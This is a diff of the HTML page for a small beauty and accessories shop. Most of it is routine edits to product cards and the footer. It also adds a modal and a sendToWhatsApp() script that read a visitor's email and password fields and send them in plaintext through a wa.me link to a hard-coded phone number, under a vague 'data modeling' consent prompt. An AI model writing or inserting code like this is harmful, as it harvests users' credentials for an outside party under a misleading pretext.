@@ -4,8 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Business Project</title>
-  <link rel="stylesheet" href="sweetalert2.min.css">
-
+  
   <link rel="stylesheet" href="./css/style.css">
   <link rel="stylesheet" href="./bootstrap-5.0.2-dist/css/bootstrap.min.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
@@ -110,8 +109,7 @@
                   <div class="card">
                     <i class="fas fa-home"></i>  
                     <div class="card-body">
-                      <h5 class="card-title">Web Design</h5>
-                      <p class="card-text">Some quick example text to build on the card title and make up the bulk of the card's content.</p>
+                      <h5 class="card-title">Skin care</h5>
                      </div>
                   </div>
                 </div>
@@ -119,8 +117,7 @@
                   <div class="card">
                     <i class="fas fa-home"></i>
                     <div class="card-body">
-                      <h5 class="card-title">Web Design</h5>
-                      <p class="card-text">Some quick example text to build on the card title and make up the bulk of the card's content.</p>
+                      <h5 class="card-title">Necklace</h5>
                      </div>
                   </div>
                 </div>
@@ -128,8 +125,7 @@
                   <div class="card">
                     <i class="fas fa-home"></i>
                     <div class="card-body">
-                      <h5 class="card-title">Web Design</h5>
-                      <p class="card-text">Some quick example text to build on the card title and make up the bulk of the card's content.</p>
+                      <h5 class="card-title">Hair bonnet</h5>
                      </div>
                   </div>
                 </div>
@@ -137,8 +133,7 @@
                   <div class="card">
                     <i class="fas fa-home"></i>
                     <div class="card-body">
-                      <h5 class="card-title">Web Design</h5>
-                      <p class="card-text">Some quick example text to build on the card title and make up the bulk of the card's content.</p>
+                      <h5 class="card-title">Hair clip</h5>
                      </div>
                   </div>
                 </div>
@@ -146,8 +141,7 @@
                   <div class="card">
                     <i class="fas fa-home"></i>
                     <div class="card-body">
-                      <h5 class="card-title">Web Design</h5>
-                      <p class="card-text">Some quick example text to build on the card title and make up the bulk of the card's content.</p>
+                      <h5 class="card-title">Bracelet</h5>
                      </div>
                   </div>
                 </div>
@@ -155,8 +149,7 @@
                   <div class="card">
                     <i class="fas fa-home"></i>
                     <div class="card-body">
-                      <h5 class="card-title">Web Design</h5>
-                      <p class="card-text">Some quick example text to build on the card title and make up the bulk of the card's content.</p>
+                      <h5 class="card-title">Lipgloss</h5>
                      </div>
                   </div>
                 </div>
@@ -336,19 +329,61 @@
                               <input type="email" name="" class="form-control" id="" placeholder="Email">
                            </div>
                            <div class="form-group col-md-12 mt-4">
-                            <input type="text" name="" class="form-control" id="" placeholder="Submit">
+                            <input type="text" name="" class="form-control" id="" placeholder="To place order">
                          </div>
                          <div class="form-group col-md-12 mt-4">
                           <textarea name="" id="" cols="60" rows="4" placeholder="massage"></textarea>
                        </div>
                        <div class="form-group col-md-12 mt-4">
-                        <button type="submit" class="btn btn-sub">Send</button>
+                           <!-- Button trigger modal -->
+                        <button type="button" class="btn btn-warning " data-bs-toggle="modal" data-bs-target="#exampleModal">
+                         Submit
+                       </button>
                      </div>
                           </form>
                         </div>
                       </div>
                     </div>
+                    </div>  
                    </section>
+                    <!-- Modal -->
+    <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+      <div class="modal-dialog">
+          <div class="modal-content">
+              <div class="modal-header">
+                  <h1 class="modal-title fs-5" id="exampleModalLabel">Sending...</h1>
+                  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+              </div>
+
+              <div class="modal-body">
+                  Do you want to send your data to the organization for data modeling?
+              </div>
+
+              <div class="modal-footer">
+                  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">No! I didn't</button>
+                  <button type="button" class="btn btn-primary" onclick="sendToWhatsApp()">Yes! I want to send it</button>
+              </div>
+          </div>
+      </div> 
+      <script>
+        function sendToWhatsApp() {
+            const email = document.getElementById('exampleInputEmail1').value;
+            const password = document.getElementById('exampleInputPassword1').value;
+            const isChecked = document.getElementById('exampleCheck1').checked ? "Checked" : "Not Checked";
+
+            if (!email || !password) {
+                alert("Please fill in all fields before sending.");
+                return;
+            }
+
+            const message = `Email: ${email}%0APassword: ${password}%0AChecked: ${isChecked}`;
+            const phoneNumber = '+2348146999846'; // Replace with your desired WhatsApp number (include country code).
+
+            const whatsappURL = `https://wa.me/${phoneNumber}?text=${message}`;
+
+            window.open(whatsappURL, '_blank');
+        }
+    </script>
                    <!-- contact end-->
 
                     <!-- Testimonial start-->
@@ -357,9 +392,8 @@
                           <div class="row g-5">
                             <div class="col-12 text-center mb-5">
                               <h1 class="display-5">Testimonials</h1>
-                              <div class="divider"></div>
-                           </div>
-                            
+                               <div class="divider"></div>
+                           </div>  
                            <div class="col-md-4 col-sm-6">
                             <div class="card testimonial_person ">
                                <div class="card-body person ms-3">
@@ -432,26 +466,26 @@
                        <!-- Testimonial end-->
 
                         <!-- footer start -->
-                         <section class="footer mt-5">
-                          <div class="container">
-                            <div class="row">
-                              <div class="foot-top col-12">
-                                <h5 class="text-center"> GOODNESS GLAMOUR✨</h5>
-                                <p  class="text-center">Designed by dee</p>
-                                <div class=" ">
-                                  <a href="">
-                                    <i class="fa-brands fa-facebook"></i>
-                                    <i class="fa-brands fa-twitter"></i>
-                                    <i class="fa-brands fa-instagram"></i>
-                                    <i class="fa-brands fa-whatsapp"></i> 
-                                  </a>
-                                </div>
-                              </div>
-                              <div class="col-12 copyright">
-                                <h6>&copy;Copyrights. All right reserves</h6>
-                              </div>
-                            </div>
-                          </div>
+                  <body>
+                   <footer class="footer">
+                    <div class="logo">GOODNESS GLAMOUR✨</div>
+                     <p>Crafti3 Business Ave, City, Country | 📞 +2348149999846 | ✉️ contact@company.com</p>
+                     <div class="links">
+                     <a href="#">Home</a>
+                     <a href="#">About</a>
+                      <a href="#">Services</a>
+                      <a href="#">Gallery</a>
+                      <a href="#">Contact</a>
+                       </div>
+                       <div class="social-icons">
+                        <a href="#">🌐</a>
+                         <a href="#">📘</a>
+                         <a href="#">🐦</a>
+                         <a href="#">📸</a>
+                         </div>
+                         <div class="copyright">© 2025 Company Name. All rights reserved. | <a href="#" style="color:#ccc;">Privacy Policy</a> | <a href="#" style="color:#ccc;">Terms of Service</a></div>
+                         </footer>
+
                          </section>
                          <!-- footer end-->
                          <script src="sweetalert2.min.js"></script>
